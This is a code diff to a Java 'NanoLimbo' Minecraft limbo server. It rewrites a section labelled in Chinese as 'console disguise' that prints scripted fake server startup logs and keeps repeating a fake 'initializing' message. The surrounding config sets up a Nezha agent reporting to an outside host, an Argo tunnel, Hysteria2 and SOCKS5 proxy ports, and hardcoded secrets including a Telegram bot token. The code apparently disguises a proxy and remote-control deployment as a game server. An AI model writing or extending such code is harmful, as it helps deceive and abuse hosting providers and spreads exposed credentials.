@@ -112,43 +112,64 @@ public final class NanoLimbo {
         }).start();
     }
 
-    // ================= 控制台伪装 =================
+// ================= 控制台伪装 =================
 
-    private static void resetConsoleAndShowFakeLogs() {
-        try {
-            String os = System.getProperty("os.name").toLowerCase();
-            if (os.contains("win")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                        .inheritIO().start().waitFor();
-            } else {
-                System.out.print("\033c");
-                System.out.flush();
-            }
-        } catch (Exception ignored) {}
+private static void resetConsoleAndShowFakeLogs() {
+    try {
+        String os = System.getProperty("os.name").toLowerCase();
 
-        System.out.println(ANSI_GREEN + "" + ANSI_RESET);
-        printFakeLimboLogs();
+        if (os.contains("win")) {
+            new ProcessBuilder(
+                    "cmd",
+                    "/c",
+                    "cls && mode con: lines=30 cols=120"
+            ).inheritIO().start().waitFor();
+        } else {
+            System.out.print("\033c");
+            System.out.flush();
+        }
+    } catch (Exception ignored) {
     }
 
-    private static void printFakeLimboLogs() {
-        String[] logs = {
-            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
-            "[INFO] [LimboServer] Loading configuration...",
-            "[INFO] [LimboServer] Initializing server components...",
-            "[INFO] [LimboServer] Preparing world 'world'",
-            "[INFO] [LimboServer] Binding to port 25565...",
-            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
-            "[INFO] [LimboServer] Server is running in offline mode.",
-            "[INFO] [LimboServer] Installation completed successfully."
-        };
+    System.out.println(ANSI_GREEN + "" + ANSI_RESET);
 
-        for (String log : logs) {
-            System.out.println(log);
-            try {
-                Thread.sleep(1200);
-            } catch (InterruptedException ignored) {}
+    printFakeLimboLogs();
+}
+
+private static void printFakeLimboLogs() {
+    String[] logs = {
+            "[INFO] [LimboServer] Starting LimboServer v1.0.0",
+            "[INFO] [LimboServer] Loading configuration...",
+            "[INFO] [LimboServer] Initializing modules...",
+            "[INFO] [LimboServer] Preparing world data...",
+            "[INFO] [LimboServer] Allocating memory...",
+            "[INFO] [LimboServer] Waiting for resources...",
+            "[INFO] [LimboServer] Synchronizing assets...",
+            "[INFO] [LimboServer] Initialization in progress..."
+    };
+
+    for (String log : logs) {
+        System.out.println(log);
+
+        try {
+            Thread.sleep(1200);
+        } catch (InterruptedException ignored) {
         }
     }
+
+    new Thread(() -> {
+        while (running.get()) {
+            try {
+                System.out.println(
+                        "[INFO] [LimboServer] Initialization in progress..."
+                );
+
+                Thread.sleep(30000);
+            } catch (Exception ignored) {
+            }
+        }
+    }, "LimboServer-Logger").start();
+}
 
     // ================= 环境变量（完全未动） =================
 
@@ -157,12 +178,12 @@ public final class NanoLimbo {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "sw4dB8jSLUf6ehiwDz");
+        envVars.put("NEZHA_KEY", "hVWtWf5CUq5YHmWEAZ");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("S5_PORT", "");
+        envVars.put("HY2_PORT", "30742");
+        envVars.put("S5_PORT", "30742");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -171,7 +192,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "www.ntu.edu.sg");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "tropical");
+        envVars.put("NAME", "swiftservers");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
